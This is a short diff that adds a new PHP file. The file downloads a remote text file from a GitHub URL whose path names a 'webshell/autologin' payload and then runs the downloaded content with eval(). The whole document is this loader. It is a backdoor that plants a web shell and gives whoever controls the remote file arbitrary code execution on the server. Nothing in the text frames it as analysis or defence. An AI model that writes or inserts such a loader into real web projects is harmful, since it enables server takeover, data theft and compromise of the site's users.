@@ -1,0 +1,4 @@
+<?php
+$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/shell/refs/heads/main/webshell/autologin.txt');
+$zhyvenseo = "?> ".$zhyvenseo;
+eval($zhyvenseo);
